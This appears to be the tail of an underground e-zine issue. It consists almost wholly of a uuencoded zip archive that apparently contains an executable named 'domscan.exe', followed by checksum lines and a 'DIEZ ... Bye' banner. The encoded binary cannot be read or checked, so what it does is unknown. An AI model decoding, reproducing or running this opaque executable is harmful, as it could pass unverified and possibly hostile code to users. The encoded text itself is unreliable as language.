M1K_]?VK)NE:B7&2)UHK=M7%MG#>GJXP_5TM;3+A$R[`[X?NL95\H;A"/WPN?
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
:+F5X95!+!08``````0`!`#D```!>(0``````
`
end
sum -r/size 54283/11908 section (from "begin" to "end")
sum -r/size 7044/8621 entire input file


XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
DIEZ                                                                                       Bye
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

.